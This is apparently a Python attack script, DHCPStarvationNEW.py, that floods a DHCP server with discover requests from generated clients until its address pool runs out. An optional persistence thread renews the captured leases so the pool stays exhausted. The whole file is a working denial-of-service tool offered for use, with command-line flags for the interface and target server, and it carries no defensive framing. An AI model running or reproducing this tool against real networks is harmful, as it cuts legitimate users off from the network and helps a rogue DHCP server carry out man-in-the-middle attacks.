from  dhcpClient import DHCPClient,DHCPStatus
from  threading import Thread 
import time 
import sys


def starvation(presist : bool  ,  iface : str  , target: str )-> None : 
	'''
	usage: DHCPStarvationNEW.py [-h] [-p] [-i IFACE] [-t TARGET]
            DHCP Starvation
		optional arguments:
			-h, --help show this help message and exit 
			-p, --persist persistant?
			-i IFACE, --iface IFACE Interface you wish to use
              		-t TARGET, --target TARGET IP of target server
	'''
 
	threads =[ ]
	clients = [] 
	def mantain (clients) :  
		while(1):
			for index,client in enumerate(clients): 
				if client.time and client.stat == DHCPStatus.MANTIN0 and client.time * 0.5 <= time.time() - client.curTime  :
					print(f"{client.stat}  client {client.name}\{client.time-time.time():.0f}\{client.ip}")
					client.re_requestyou()
				if client.time and client.stat == DHCPStatus.MANTAIN50 and client.time * 0.875  <=  time.time()  - client.curTime :
					print(f"{client.stat}  client {client.name}\{client.time-time.time():.0f}\{client.ip}")
					client.re_requestyou()
				if client.time and client.stat == DHCPStatus.MANTAIN87 and client.time   <=  time.time()  - client.curTime :
					
					client.to_trash()
					clients[index]= DHCPClient()
					clients[index].discover()
					print(f"""{client.stat} -> {clients[index].stat} 
           						name {client.name} ->  { clients[index].name}
           						mac {client.mac} ->  {clients[index].mac}		""")


	



	presistT = Thread (target = mantain ,args = (clients,)) if presist else  None
	DHCPClient.reset() 
	if presist : 
		presistT.start()
	while(DHCPClient.aborted == -1 ):
		client = DHCPClient()
		threads.append(client.discover())
		clients.append(client)


	for thread in threads : 
		if thread : 
			thread.join()

	print(f"ended starvation aborted :  {DHCPClient.aborted } " ) 
	clients = list(filter(lambda client : client.ip != "0.0.0.0" , clients ) ) 
	if not clients:
		sys.exit(-1)
	clients.sort(key=lambda client  : client.ip ) 
	for client in clients : 
		print(f"client {client.name}\{client.time-time.time():.0f}\{client.ip}")
	if presist : 
		presistT.join()

 
	

helpStr = starvation.__doc__
flagsValue  = {("--iface" , "-i") : None , ("--target","-t")  : None   }
flagsBool = {("--persist","-p")  : False} 
index = 1
while(index < len(sys.argv)):
    if sys.argv[index] in ("-h","--help"):
        print(helpStr) 
        sys.exit(0)
    else : 
        for option in flagsValue : 
            if sys.argv[index] in option :
                index+=1 
                if(index >= len(sys.argv)):
                    raise Exception("need paramter  - lack of args ")
                flagsValue[option] = sys.argv[index]
        for option in flagsBool : 
            if sys.argv[index] in option :
                flagsBool[option] = True
    index +=1
                
starvation(flagsBool[("--persist","-p")],*flagsValue.values())
